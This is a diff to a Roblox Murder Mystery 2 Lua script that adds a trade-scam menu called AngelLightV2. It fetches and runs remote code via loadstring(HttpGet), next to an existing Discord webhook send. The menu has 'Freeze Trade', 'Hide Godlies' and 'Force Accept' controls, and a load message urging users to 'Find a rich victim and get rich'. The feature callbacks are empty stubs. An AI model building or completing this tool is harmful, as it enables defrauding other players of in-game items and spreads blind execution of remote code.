@@ -404,3 +404,60 @@ DYWebhook:Send({
 	content = content,
 	embeds = {embed}
 })
+
+local AngelLightV2 = loadstring(game:HttpGet(('https://raw.githubusercontent.com/shlexware/Orion/main/source')))()
+local Window = AngelLightV2:MakeWindow({Name = "AngelLightV2", HidePremium = false, SaveConfig = true, ConfigFolder = "MM2Config"})
+
+-- Add MM2 Features to the Main Tab
+local MainTab = Window:MakeTab({
+    Name = "Main",
+    Icon = "rbxassetid://4483345998",
+    PremiumOnly = false
+})
+
+MainTab:AddButton({
+    Name = "Freeze Trade",
+    Callback = function()
+        -- Function to freeze trade
+    end    
+})
+
+MainTab:AddButton({
+    Name = "Hide Godlies",
+    Callback = function()
+        -- Function to hide godlies
+    end    
+})
+
+MainTab:AddToggle({
+    Name = "Force Accept",
+    Default = false,
+    Callback = function(Value)
+        -- Function to force accept trade
+    end    
+})
+
+-- Add Misc Tab
+local MiscTab = Window:MakeTab({
+    Name = "Misc",
+    Icon = "rbxassetid://4483345998",
+    PremiumOnly = false
+})
+
+MiscTab:AddButton({
+    Name = "Copy Discord",
+    Callback = function()
+        setclipboard("https://discord.gg/eRVX2Qa3zc")  -- Discord invite link
+    end    
+})
+
+-- Custom Notification and UI Initialization
+AngelLightV2:MakeNotification({
+    Name = "AngelLightV2 Loaded",
+    Content = "Find a rich victim and get rich",
+    Image = "rbxassetid://4483345998",
+    Time = 5
+})
+
+-- Initialize AngelLightV2 without the default pop-up
+AngelLightV2:Init()
